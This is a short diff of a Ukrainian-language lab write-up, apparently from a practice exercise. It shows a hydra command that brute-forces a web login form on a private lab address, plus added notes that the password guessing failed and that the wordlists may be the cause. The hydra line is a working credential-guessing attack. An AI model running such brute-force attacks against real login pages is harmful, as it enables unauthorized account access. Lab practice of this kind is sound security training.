@@ -33,7 +33,11 @@
 ```jsx
 hydra -L ./usernames.txt -P ./passwords0-20000.txt 192.168.56.12 http-post-form '/login.php:username=^USER^&password=^PASS^&wp-submit=Log+In:F=Invalid username'
 ```
-
+Навіть після підбору за 10к, 100к, 1к, не вдалось підібрати пароль. Як можна бачити на другому скріні, запити вдібуваються,значить проблема саме в файлах що підбирають пароль або username.
+- username:
+тут були взяті ті юзернейми що і на відео
+- pass:
+тут були взяті топ 100к найвідоміших паролів відфільтовані від 8 символів
 ![image.png](images/image%207.png)
 
 ![image.png](images/image%208.png)
